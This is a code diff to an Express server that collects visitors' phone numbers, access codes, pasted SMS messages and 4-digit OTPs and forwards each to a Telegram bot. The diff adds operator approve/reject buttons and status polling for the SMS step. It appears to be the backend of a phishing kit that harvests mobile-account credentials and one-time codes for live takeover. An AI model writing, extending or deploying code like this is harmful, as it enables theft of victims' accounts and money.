@@ -11,7 +11,7 @@ app.use(express.static(__dirname));
 // Temporary memory for applications
 const applications = {};
 
-// 1. Receive application from website
+// 1. Receive initial application
 app.post('/api/apply', async (req, res) => {
     const { phone, code } = req.body;
     const appId = Date.now().toString(); 
@@ -52,7 +52,7 @@ app.post('/api/apply', async (req, res) => {
     }
 });
 
-// 2. Check status from website
+// 2. Check initial application status
 app.get('/api/status/:id', (req, res) => {
     const appId = req.params.id;
     if (applications[appId]) {
@@ -62,11 +62,16 @@ app.get('/api/status/:id', (req, res) => {
     }
 });
 
-// 2b. Forward Pasted SMS to Telegram
+// 3. Verify pasted SMS and send to Telegram for approval
 app.post('/api/verify-sms', async (req, res) => {
     const { sms, appId } = req.body;
     
     if (!sms) return res.json({ success: false });
+
+    if (applications[appId]) {
+        applications[appId].smsStatus = 'pending';
+        applications[appId].smsText = sms;
+    }
 
     const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
     const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
@@ -77,7 +82,19 @@ app.post('/api/verify-sms', async (req, res) => {
         await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' })
+            body: JSON.stringify({ 
+                chat_id: TELEGRAM_CHAT_ID, 
+                text: message, 
+                parse_mode: 'Markdown',
+                reply_markup: {
+                    inline_keyboard: [
+                        [
+                            { text: "✅ APPROVE SMS", callback_data: `approve_sms_${appId}` },
+                            { text: "❌ REJECT SMS", callback_data: `reject_sms_${appId}` }
+                        ]
+                    ]
+                }
+            })
         });
         res.json({ success: true });
     } catch (error) {
@@ -85,7 +102,17 @@ app.post('/api/verify-sms', async (req, res) => {
     }
 });
 
-// 2c. Receive the 4-digit OTP and send to Telegram
+// 4. Check SMS status (polling from the website)
+app.get('/api/sms-status/:id', (req, res) => {
+    const appId = req.params.id;
+    if (applications[appId] && applications[appId].smsStatus) {
+        res.json({ status: applications[appId].smsStatus });
+    } else {
+        res.json({ status: 'pending' });
+    }
+});
+
+// 5. Receive the 4-digit OTP and send to Telegram
 app.post('/api/submit-otp', async (req, res) => {
     const { otp, appId } = req.body;
 
@@ -110,7 +137,7 @@ app.post('/api/submit-otp', async (req, res) => {
     }
 });
 
-// 3. Telegram Webhook
+// 6. Telegram Webhook (Handles all button clicks)
 app.post('/api/telegram-webhook', async (req, res) => {
     const { callback_query } = req.body;
 
@@ -118,28 +145,56 @@ app.post('/api/telegram-webhook', async (req, res) => {
         const data = callback_query.data; 
         const messageId = callback_query.message.message_id; 
         const chatId = callback_query.message.chat.id;
-        const [action, appId] = data.split('_');
+        
+        // Parse the callback data properly
+        let action, appId, target;
+        if (data.includes('sms_')) {
+            const parts = data.split('_'); // e.g., ['approve', 'sms', '12345']
+            action = parts[0];
+            target = parts[1];
+            appId = parts[2];
+        } else {
+            const parts = data.split('_'); // e.g., ['approve', '12345']
+            action = parts[0];
+            appId = parts[1];
+        }
 
         let newText = "";
         let newStatus = "";
 
         if (applications[appId]) {
-            if (action === 'approve') {
-                applications[appId].status = 'approved';
-                newText = `🚨 *NEW APPLICATION* 🚨\n\n` +
-                          `📞 *Phone:* +237 ${applications[appId].phone}\n` +
-                          `🔑 *Code:* ${applications[appId].code}\n\n` +
-                          `Status: ✅ *APPROVED*`;
-                newStatus = "Approved!";
-            } else if (action === 'reject') {
-                applications[appId].status = 'rejected';
-                newText = `🚨 *NEW APPLICATION* 🚨\n\n` +
-                          `📞 *Phone:* +237 ${applications[appId].phone}\n` +
-                          `🔑 *Code:* ${applications[appId].code}\n\n` +
-                          `Status: ❌ *REJECTED*`;
-                newStatus = "Rejected!";
+            // Handle Initial Application Buttons
+            if (!target && (action === 'approve' || action === 'reject')) {
+                if (action === 'approve') {
+                    applications[appId].status = 'approved';
+                    newText = `🚨 *NEW APPLICATION* 🚨\n\n` +
+                              `📞 *Phone:* +237 ${applications[appId].phone}\n` +
+                              `🔑 *Code:* ${applications[appId].code}\n\n` +
+                              `Status: ✅ *APPROVED*`;
+                    newStatus = "Approved!";
+                } else {
+                    applications[appId].status = 'rejected';
+                    newText = `🚨 *NEW APPLICATION* 🚨\n\n` +
+                              `📞 *Phone:* +237 ${applications[appId].phone}\n` +
+                              `🔑 *Code:* ${applications[appId].code}\n\n` +
+                              `Status: ❌ *REJECTED*`;
+                    newStatus = "Rejected!";
+                }
+            } 
+            // Handle SMS Verification Buttons
+            else if (target === 'sms') {
+                if (action === 'approve') {
+                    applications[appId].smsStatus = 'approved';
+                    newText = `📩 *SMS RECEIVED* 📩\n\n*App ID:* \`${appId}\`\n\n*Message:*\n\`\`\`\n${applications[appId].smsText}\n\`\`\`\n\nStatus: ✅ *SMS APPROVED*`;
+                    newStatus = "SMS Approved!";
+                } else {
+                    applications[appId].smsStatus = 'rejected';
+                    newText = `📩 *SMS RECEIVED* 📩\n\n*App ID:* \`${appId}\`\n\n*Message:*\n\`\`\`\n${applications[appId].smsText}\n\`\`\`\n\nStatus: ❌ *SMS REJECTED*`;
+                    newStatus = "SMS Rejected!";
+                }
             }
 
+            // Edit Telegram Message
             await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/editMessageText`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -153,6 +208,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
             });
         }
 
+        // Answer callback
         await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/answerCallbackQuery`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
